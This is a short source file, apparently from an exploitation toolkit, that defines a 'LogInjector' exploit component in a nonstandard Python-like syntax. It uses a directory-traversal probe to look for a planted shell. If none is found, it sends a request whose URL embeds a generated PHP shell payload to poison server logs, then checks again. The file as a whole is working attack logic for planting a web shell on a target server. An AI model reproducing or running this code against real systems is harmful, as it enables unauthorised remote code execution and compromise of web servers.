import('urllib2');

class init ExploitComponent LogInjector {
    __init__: @(url, next_data=None, dot='.',
                separator='/', terminator='') {
        self.probe = TraversalProbe('blank command', url, next_data,
                                    dot, separator, terminator);
        self.emitter = PhpShellEmitter();
    },

    find_shell: @() {
        self.log('[i] Searching for shell');
        s = self.probe.scan();
        if (s != null) self.log('[+] Shell found');
        else self.log('[-] Shell not found');
        ret s;
    },

    send_shell: @() {
        self.log('[i] Injecting shell');
        u = self.url % self.emitter.emit();
        self.log('    Url: ' + u);
        urllib2.urlopen(u);
    },

    inject: @() {
        shell = self.find_shell();
        if (shell == null) {
            self.send_shell();
            shell = self.find_shell();
        }
        ret shell;
    },
};
